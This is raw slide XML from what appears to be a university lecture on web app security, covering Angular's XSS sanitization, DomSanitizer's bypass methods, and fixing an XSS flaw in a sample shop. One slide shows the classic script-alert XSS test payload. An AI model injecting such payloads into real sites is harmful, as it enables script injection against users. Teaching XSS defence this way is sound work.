              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="254"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&amp;lt;script&amp;gt;alert(&amp;quot;XSS&amp;quot;)&amp;lt;/script&amp;gt;</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="6" name="object 6" descr=""/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="4460494" y="4654041"/>
            <a:ext cx="457834" cy="307340"/>
            <a:chOff x="4460494" y="4654041"/>
            <a:chExt cx="457834" cy="307340"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="7" name="object 7" descr=""/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="4466844" y="4660391"/>
              <a:ext cx="445134" cy="294640"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="445135" h="294639">
                  <a:moveTo>
                    <a:pt x="239140" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="239140" y="73532"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="73532"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="220598"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="239140" y="220598"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="239140" y="294131"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="445007" y="147065"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="239140" y="0"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:solidFill>
              <a:srgbClr val="00637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 descr=""/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="4466844" y="4660391"/>
              <a:ext cx="445134" cy="294640"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="445135" h="294639">
                  <a:moveTo>
                    <a:pt x="0" y="73532"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="239140" y="73532"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="239140" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="445007" y="147065"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="239140" y="294131"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="239140" y="220598"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="220598"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="73532"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:ln w="12700">
              <a:solidFill>
                <a:srgbClr val="00252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pic>
        <p:nvPicPr>
          <p:cNvPr id="9" name="object 9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695188" y="5152644"/>
            <a:ext cx="5183123" cy="1024128"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="object 10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/>
              <a:t>Luigi</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Libero</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Lucio</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Starace,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Ph.D.</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35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University</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>of</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Naples</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Federico</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>II</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t>Technologies</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Course</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Lecture</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>23</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>App</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>Security</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="object 11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dirty="0" spc="-25"/>
              <a:t>10</a:t>
            </a:fld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/>
              <a:t>Luigi</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Libero</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Lucio</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Starace,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Ph.D.</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35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University</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>of</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Naples</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Federico</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>II</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t>Technologies</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Course</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Lecture</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>23</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>App</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>Security</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="object 5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dirty="0" spc="-25"/>
              <a:t>10</a:t>
            </a:fld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70"/>
              <a:t>ANGULAR</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-50"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t>XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-70"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-204"/>
              <a:t>SECURITY</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-50"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>MODEL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962050" y="1533220"/>
            <a:ext cx="10118725" cy="4170045"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="60325" rIns="0" bIns="0" rtlCol="0" vert="horz">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="240029" marR="363855" indent="-227329">
              <a:lnSpc>
                <a:spcPts val="3030"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="475"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="241300" algn="l"/>
              </a:tabLst>
            </a:pP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Angular</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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automatically</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-9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sanitizes</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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all</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-9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 b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>untrusted</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-70" b="1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data</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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that</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-9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is</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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bound</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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25">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>or </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-25">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>	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interpolated</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-3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in</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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a</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-3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template</a:t>
            </a:r>
            <a:endParaRPr sz="2800">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="240029" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="620"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="240029" algn="l"/>
              </a:tabLst>
            </a:pP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By</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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default,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>all</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-45" b="1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b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>data</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-35" b="1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b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>is</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-50" b="1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 b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>untrusted</a:t>
            </a:r>
            <a:endParaRPr sz="2800">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="240029" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="660"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="240029" algn="l"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-40">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>You</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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can</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>explicitly</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-55" b="1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mark</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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some</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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data</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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as</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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 b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>trusted</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-70" b="1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using</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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the</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-9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u="sng" sz="2800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:uFill>
                  <a:solidFill>
                    <a:srgbClr val="006379"/>
                  </a:solidFill>
                </a:uFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>DomSanitizer</a:t>
            </a:r>
            <a:endParaRPr sz="2800">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="240029" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="665"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="240029" algn="l"/>
              </a:tabLst>
            </a:pP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DomSanitizer</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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include</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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metods</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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such</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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25">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>as</a:t>
            </a:r>
            <a:endParaRPr sz="2800">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" marL="696595" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="254"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="696595" algn="l"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="2400">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>bypassSecurityTrustHtml(value:</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-145">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400">
                <a:solidFill>
                  <a:srgbClr val="0000FC"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>string</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>):</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-150">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="0000FC"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>SafeHtml</a:t>
            </a:r>
            <a:endParaRPr sz="2400">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="240029" marR="1121410" indent="-227329">
              <a:lnSpc>
                <a:spcPts val="3020"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1005"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="241300" algn="l"/>
              </a:tabLst>
            </a:pP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These</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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methods</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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can</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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mark</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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data</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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as</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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trusted</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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in</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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specific</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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contexts,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	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bypassing</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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the</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-10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default</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-9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security</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-10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mechanisms</a:t>
            </a:r>
            <a:endParaRPr sz="2800">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="240029" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="630"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="240029" algn="l"/>
              </a:tabLst>
            </a:pP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Of</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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course,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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they</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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must</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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be</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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used</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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with</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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caution!</a:t>
            </a:r>
            <a:endParaRPr sz="2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/>
              <a:t>Luigi</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Libero</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Lucio</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Starace,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Ph.D.</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35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University</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>of</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Naples</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Federico</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>II</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t>Technologies</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Course</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Lecture</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>23</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>App</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>Security</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="object 5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dirty="0" spc="-25"/>
              <a:t>10</a:t>
            </a:fld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30"/>
              <a:t>FIXING</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-215"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>THE</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-215"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t>XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-200"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>IN</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-210"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>THE</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-200"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-55"/>
              <a:t>WEB</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-204"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-45"/>
              <a:t>TECH</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-200"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t>SHOP</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="3" name="object 3" descr=""/>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="876731" y="2026285"/>
          <a:ext cx="10514965" cy="279019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97865"/>
                <a:gridCol w="540385"/>
                <a:gridCol w="9187815"/>
              </a:tblGrid>
              <a:tr h="297180">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr marL="112395">
                        <a:lnSpc>
                          <a:spcPts val="2055"/>
                        </a:lnSpc>
                      </a:pPr>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-50">
                          <a:solidFill>
                            <a:srgbClr val="111F35"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>1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B="0" marT="0">
                    <a:lnL w="12700">
                      <a:solidFill>
                        <a:srgbClr val="111F35"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnL>
                    <a:lnT w="12700">
                      <a:solidFill>
                        <a:srgbClr val="111F35"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnT>
                    <a:solidFill>
                      <a:srgbClr val="D9D9D9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344805">
                        <a:lnSpc>
                          <a:spcPts val="2055"/>
                        </a:lnSpc>
                      </a:pPr>
                      <a:r>
                        <a:rPr dirty="0" sz="1800">
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>filterTable</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-30">
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t> </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800">
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>()</a:t>
